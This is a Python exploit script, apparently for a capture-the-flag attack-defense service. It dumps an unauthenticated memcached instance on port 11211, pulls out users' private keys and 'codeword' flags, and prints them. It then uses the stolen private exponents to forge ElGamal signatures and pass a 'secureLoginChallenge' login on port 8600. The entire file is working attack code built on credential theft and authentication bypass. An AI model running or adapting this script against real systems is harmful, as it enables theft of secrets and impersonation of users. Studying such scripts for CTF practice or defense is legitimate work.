#!/usr/bin/env python3

import json
import math
import random
import re
import subprocess
import sys

import requests

# Path to memcached-tool
MEMCACHED_TOOL = "memcached-tool"

ip = sys.argv[1]

memcached = subprocess.run(
    [MEMCACHED_TOOL, f"{ip}:11211", "dump", "1024"],
    capture_output=True   
).stdout.decode()

public = {}
private = {}

user_id = None
for line in memcached.splitlines():
    if line.startswith("add"):
        # add 123456.Certificate
        user_id = line.split()[1].split(".")[0]
    if line.startswith("{"):
        content = json.loads(line)
        if "codeword" in content:
            # flags from private keys
            print(content["codeword"], flush=True)
            private[user_id] = content
        else:
            public[user_id] = content

def solve(a, b):
    # find solution for ax + by == 1 that 0 < x < n

    if a == 0:
        return (0, 1)

    x, y = solve(b % a, a)

    x, y = y - (b // a) * x, x

    while x < 0:
        x += b
        y -= a

    return (x, y)


def inverse(a, n):
    # find x such that ax == 1 (mod n)

    x, y = solve(a, n)
    return x

for user_id in private:
    if user_id not in public:
        # strange, skipping
        continue

    puk = public[user_id]
    prk = private[user_id]

    s = requests.Session()

    r = s.get(f"http://{ip}:8600/secureLoginChallenge")

    try:
        message, = re.findall('<pre>([0-9,]+)</pre>', r.text)
    except:
        continue

    message = int(message.replace(",", ""))

    modulo = int(puk['modulo'])

    while True:
        onetime = random.randint(2, modulo - 2)
        if math.gcd(onetime, modulo - 1) == 1:
            break

    base = int(puk['base'])
    high = pow(base, onetime, modulo)

    exponent = int(prk['exponent'])

    low = message - exponent * high
    inv = inverse(onetime, modulo - 1)
    low = (low * inv) % (modulo - 1)
    if low < 0:
        low += modulo - 1

    r = s.post(
        f"http://{ip}:8600/secureLoginChallenge",
        data={
            "key": json.dumps(puk),
            "high": str(high),
            "low": str(low)
        },
        allow_redirects=True
    )

    print(re.findall(r'black;">([^<]+)</strong', r.text), flush=True)
